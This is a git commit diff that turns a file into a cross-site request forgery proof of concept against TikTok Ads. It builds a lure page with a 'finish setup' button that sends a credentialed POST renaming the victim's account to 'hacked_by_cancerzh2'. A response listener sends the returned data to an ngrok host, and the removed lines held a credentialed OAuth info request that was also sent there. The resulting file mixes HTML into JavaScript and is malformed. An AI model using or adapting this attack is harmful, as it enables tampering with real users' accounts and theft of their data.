679891816d190d320199321b60502899174487f7
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-26 01:11:43 +0700

    Update login1.html

--- login1.js
+++ login1.js
@@ -1,11 +1,31 @@
+<html>
+<body>
+<title>CSRF on tiktok ads</title>
+<script>
+function getMe(){
+// retrieve page content
 var xhr = new XMLHttpRequest();
+// now execute the CSRF attack
+xhr.open("POST",
+"https://ads.tiktok.com/web/user/update/user_info/", true);
+xhr.withCredentials="true";
+
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onload = reqListener; 
-xhr.open("GET", "https://ads.tiktok.com/ac/api/v1/oauth/tt_oauth_base_info?msToken=8OLXQsITlBMGlv_JTV-1nOiVJUQ-I-2RB3uVh9YzJWSDTWWkQRK2tUgF4kn5IoBdg8rf5NYNNiJquWQonJQYOmR4Aa4nbaOjC5ZWzcaraobpiToTKSNRYW2bqbXY6TDHlfc=&X-Bogus=DFSzsIVOKokANHbAtxrWi0WdbTLk&_signature=_02B4Z6wo00001Xdm9DgAAIDBXR8MrXfTMgV3Z.CAADk177");
+xhr.open("POST", "https://ads.tiktok.com/web/user/update/user_info/");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send();
+xhr.send('aid=1583&language=en&account_sdk_source=web&fp=verify_ldg8d6wz_dJfbg8DW_Ni91_4lTb_Be17_4vSJJFLGIAm6&name=hacked_by_cancerzh2');
+}
+</script><center>
+<h1>CSRF To Overwrite Current tiktok ads name</h1>
+<button onclick="getMe();">Click me to finist setup your name</button>
+</center>
+<link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/about.7b20bf6d.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/auth.b9dc8602.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/debug.e1741249.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/shopify.75e15f6e.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/about.c3d853f7.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/auth.e6ff3036.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/debug.4ff65c90.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/shopify.0ecc73ef444.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-common.c4960cbf.css rel=preload as=style><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-vendors.b67a507a.css rel=preload as=style><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/index.5784ac0a.css rel=preload as=style><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-common.38a291fe.js rel=preload as=script><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-vendors.273d7232.js rel=preload as=script><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/index.ea34be5944.js rel=preload as=script><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-vendors.b67a507a.css rel=stylesheet><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-common.c4960cbf.css rel=stylesheet><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/index.5784ac0a.css rel=stylesheet></head><body><div id=app></div><script src=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-vendors.273d7232.js></script><script src=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-common.38a291fe.js></script><script src=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/index.ea34be5944.js></script>
+</body>
+</html>
 
 function reqListener() {
-    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
+    location='//11b0-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
 };
